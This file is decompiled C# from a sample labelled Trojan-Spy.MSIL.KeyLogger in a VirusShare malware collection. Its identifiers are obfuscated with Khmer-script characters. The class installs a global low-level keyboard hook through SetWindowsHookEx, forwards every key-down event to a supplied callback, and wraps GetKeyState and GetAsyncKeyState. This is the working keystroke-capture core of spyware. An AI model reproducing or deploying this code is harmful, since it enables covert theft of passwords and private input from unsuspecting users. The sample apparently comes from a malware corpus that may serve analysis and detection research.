// Decompiled with JetBrains decompiler
// Type: ណ
// Assembly: dskl, Version=1.71.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5380AAD3-568D-45D6-B9BC-59CE5C1E3490
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Spy.MSIL.KeyLogger.czk-cde7546df369e926f201a20ea21a174728391b0927412058c56dcdd5367e606c.exe

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public static class ណ
{
  private static IntPtr ᡈᙃ = IntPtr.Zero;
  private static ណ.ប ᡉᙃ;
  private static ណ.ព ᡊᙃ;
  private static អ ᡋᙃ = new អ();

  public static void \u17BE(ណ.ព _kh)
  {
    try
    {
      ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
      ណ.ᡉᙃ = new ណ.ប(ណ.ᡇᙃ);
      ណ.ᡊᙃ = _kh;
      ណ.ᡈᙃ = ណ.ᡆᙃ.SetWindowsHookEx(13, ណ.ᡉᙃ, ណ.ᡆᙃ.GetModuleHandle(mainModule.ModuleName), 0U);
    }
    catch (Exception ex)
    {
      ណ.ᡋᙃ.ឨ(ex);
    }
  }

  public static bool ធ() => ណ.ᡆᙃ.UnhookWindowsHookEx(ណ.ᡈᙃ);

  public static short ក(ᡈ vk) => ណ.ᡆᙃ.GetKeyState(vk);

  public static short រ(ᡈ vk) => ណ.ᡆᙃ.GetAsyncKeyState(vk);

  private static IntPtr ᡇᙃ(int ᙂ, IntPtr ᙄ, IntPtr ᙆ)
  {
    int int32 = ᙄ.ToInt32();
    if (ᙂ >= 0 && (int32 == 256 || int32 == 260))
      ណ.ᡊᙃ(ᙄ, ᙆ);
    return ណ.ᡆᙃ.CallNextHookEx(ណ.ᡈᙃ, ᙂ, ᙄ, ᙆ);
  }

  private static class ᡆᙃ
  {
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern short GetKeyState(ᡈ vk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern short GetAsyncKeyState(ᡈ vk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr SetWindowsHookEx(
      int idHook,
      ណ.ប lpfn,
      IntPtr hMod,
      uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CallNextHookEx(
      IntPtr hhk,
      int nCode,
      IntPtr wParam,
      IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
  }

  public delegate IntPtr ប(int nCode, IntPtr wParam, IntPtr lParam);

  public delegate void ព(IntPtr wParam, IntPtr lParam);
}
